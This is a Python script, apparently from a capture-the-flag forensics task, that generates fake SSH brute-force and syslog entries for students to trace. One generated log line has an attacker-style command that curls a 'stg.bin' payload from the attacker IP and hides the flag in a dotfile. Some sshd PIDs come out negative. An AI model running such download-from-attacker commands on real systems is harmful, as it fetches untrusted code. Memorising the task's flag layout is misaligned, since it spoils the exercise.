"""Generate a realistic auth.log + syslog for the log-trace task.

The attacker IP is random, the compromised account is random, and the flag is
only present in the syslog command log for that account's session.
"""

import random
import sys
from datetime import datetime, timedelta

USERS = ["deploy", "ci-runner", "monitoring", "svc_backup", "dbadmin", "jenkins"]
DECOY_IPS = ["45.148.10.87", "91.240.118.172", "185.220.101.34", "196.52.43.60"]


def main() -> None:
    flag, auth_path, syslog_path = sys.argv[1], sys.argv[2], sys.argv[3]
    random.seed(random.SystemRandom().randint(0, 1 << 62))
    attacker_ip = f"{random.randint(2, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(2, 254)}"
    victim = random.choice(USERS)
    t0 = datetime(2026, 3, 14, 2, 13, 0)
    auth, sysl = [], []

    for i in range(60):
        ts = (t0 + timedelta(seconds=i * 37)).strftime("%b %d %H:%M:%S")
        u = random.choice(USERS)
        auth.append(
            f"{ts} srv-web01 sshd[{-2000 + i}]: Failed password for {u} from {attacker_ip} port {40000 + i * 7} ssh2"
        )

    for ip in DECOY_IPS:
        ts = (t0 + timedelta(minutes=random.randint(5, 50))).strftime("%b %d %H:%M:%S")
        u = random.choice(USERS)
        auth.append(
            f"{ts} srv-web01 sshd[{random.randint(1000, 9999)}]: Failed password for invalid user admin from {ip} port {random.randint(30000, 60000)} ssh2"
        )

    ts_ok = (t0 + timedelta(minutes=55)).strftime("%b %d %H:%M:%S")
    auth.append(
        f"{ts_ok} srv-web01 sshd[3141]: Accepted password for {victim} from {attacker_ip} port 49377 ssh2"
    )
    auth.append(
        f"{ts_ok} srv-web01 sshd[3141]: pam_unix(sshd:session): session opened for user {victim}(uid=1002) by (uid=0)"
    )
    auth.append(f"{ts_ok} srv-web01 systemd-logind[812]: New session 47 of user {victim}.")

    t1 = t0 + timedelta(minutes=56)
    sysl.append(
        f"{t1.strftime('%b %d %H:%M:%S')} srv-web01 sudo: {victim} : TTY=pts/0 ; PWD=/home/{victim} ; USER=root ; COMMAND=/usr/bin/tail /var/log/nginx/access.log"
    )
    t2 = t0 + timedelta(minutes=57)
    sysl.append(
        f"{t2.strftime('%b %d %H:%M:%S')} srv-web01 sudo-command: {victim} ran: sh -c 'cd /home/{victim} && curl -s http://{attacker_ip}:8081/stg.bin -O && echo {flag} > .cache/.s && chmod 600 .cache/.s'"
    )
    sysl.append(
        f"{t2.strftime('%b %d %H:%M:%S')} srv-web01 CRON[3320]: (root) CMD (cd /home/{victim} && ls -la)"
    )

    random.shuffle(auth)
    auth.sort(key=lambda l: l[4:20])  # keep chronological
    open(auth_path, "w").write("\n".join(auth) + "\n")
    open(syslog_path, "w").write("\n".join(sorted(sysl)) + "\n")
    print(f"generated: attacker={attacker_ip} victim={victim}")


if __name__ == "__main__":
    main()
